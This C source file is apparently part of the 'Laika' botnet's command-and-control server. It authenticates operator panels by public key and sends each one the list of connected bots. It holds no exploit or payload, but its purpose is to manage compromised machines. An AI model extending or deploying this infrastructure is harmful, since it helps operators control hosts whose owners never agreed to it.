#include "lerror.h"
#include "cnc.h"
#include "cpanel.h"

inline void checkAuthenticated(struct sLaika_peer *peer) {
    if (peer->type != PEER_PANEL)
        LAIKA_ERROR("malicious peer!");
}

bool sendPanelPeerIter(struct sLaika_socket *sock, void *uData) {
    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
    struct sLaika_peer *panel = (struct sLaika_peer*)uData;
    struct sLaika_cnc *cnc = (struct sLaika_cnc*)panel->uData;

    /* make sure we're not sending cnc info lol, also don't send connection information about themselves */
    if (&peer->sock != &cnc->sock && peer != panel) {
        LAIKA_DEBUG("sending peer info %lx (cnc: %lx, panel: %lx)\n", peer, cnc, panel);
        laikaC_sendNewPeer(panel, peer);
    }

    return true;
}

void laikaC_sendNewPeer(struct sLaika_peer *panel, struct sLaika_peer *bot) {
    laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_ADD_PEER);

    /* write the bot's pubkey & peerType */
    laikaS_write(&panel->sock, bot->peerPub, sizeof(bot->peerPub));
    laikaS_writeByte(&panel->sock, bot->type);

    laikaS_endOutPacket(panel);
}

void laikaC_sendRmvPeer(struct sLaika_peer *panel, struct sLaika_peer *bot) {
    laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_RMV_PEER);

    /* write the bot's pubkey */
    laikaS_write(&panel->sock, bot->peerPub, sizeof(bot->peerPub));
    laikaS_writeByte(&panel->sock, bot->type);

    laikaS_endOutPacket(panel);
}

void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *panel, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
    panel->type = laikaS_readByte(&panel->sock);

    switch (panel->type) {
        case PEER_CNC:
        case PEER_PANEL:
            /* check that peer's pubkey is authenticated */
            if (sodium_memcmp(panel->peerPub, cnc->pub, sizeof(cnc->pub)) != 0)
                LAIKA_ERROR("unauthorized panel!\n");

            /* add to cnc's list of authenticated panels */
            laikaC_addPanel(cnc, panel);
            LAIKA_DEBUG("Accepted authenticated panel %lx\n", panel);

            /* they passed! send list of our peers */
            laikaP_iterList(&cnc->pList, sendPanelPeerIter, (void*)panel);

            /* notify other peers */
            laikaC_onRmvPeer(cnc, panel);
            laikaC_onAddPeer(cnc, panel);
            break;
        default:
            LAIKA_ERROR("unknown peerType [%d]!\n", panel->type);
    }
}